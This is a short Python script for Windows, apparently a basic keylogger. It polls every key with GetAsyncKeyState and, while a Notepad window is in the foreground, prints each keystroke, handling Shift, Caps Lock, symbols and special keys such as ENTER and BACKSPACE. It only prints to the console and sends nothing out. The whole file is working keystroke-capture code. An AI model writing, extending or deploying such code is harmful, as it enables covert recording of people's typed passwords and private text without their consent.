from ctypes import *
from win32gui import GetWindowText, GetForegroundWindow

getKey = windll.user32.GetAsyncKeyState

keyboardList = {0x30: ")", 0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%", 0x36: "^", 0x37: "&", 0x38: "*", 0x39: "(", 0xDB: "{", 0xDD: "}",
                0xDC: "|", 0xBA: ":", 0xDE: "\"", 0xBC: "<", 0xBE: ">", 0xBF: "?", 0xC0: "~"}
specialKey = {0x9: "<TAB>", 0x11: "<CTRL>", 0xA4: "<ALT>", 0x8: "<BACKSPACE>", 0xD: "<ENTER>", 0x20: "<SPACE>", 0x10: "<SHIFT>", 0x14: "<CAPS LOCK>",
              0x21: "<PGUP>", 0x22: "<PGDOWN>", 0x23: "<END>", 0x24: "<HOME>", 0x25: "<LEFT>", 0x26: "<UP>", 0x27: "<RIGHT>", 0x28: "<DOWN>"}

#0x21: "<PGUP>", 0x22: "<PGDOWN>", 0x23: "<END>", 0x24: "<HOME>", 0x25: "<LEFT>", 0x26: "<UP>", 0x27: "<RIGHT>", 0x28: "<DOWN>"
#0xDB: "{", 0xDD: "}", 0xDC: "|", 0xBA: ":", 0xDE: """, 0xBC: "<", 0xBE: ">", 0xBF: "?", 0xC0: "~"

for i in range(256):
    getKey(i)

while True:
    for i in range(256):
        if getKey(i) & 1:
            if "Notepad" in GetWindowText(GetForegroundWindow()):
                print(hex(i),i)
                if 0x41 <= i <= 0x5A:
                    if windll.user32.GetKeyState(0x14):
                        if windll.user32.GetAsyncKeyState(0x10):
                            print(chr(i).lower())
                        else:
                            print(chr(i).upper())
                    else:
                        if windll.user32.GetAsyncKeyState(0x10):
                            print(chr(i).upper())
                        else:
                            print(chr(i).lower())
                elif 0x30 <= i <= 0x39:
                    if windll.user32.GetAsyncKeyState(0x10):
                        print(keyboardList[i])
                    else:
                        print(chr(i))
                elif i in specialKey:
                    print(specialKey[i])
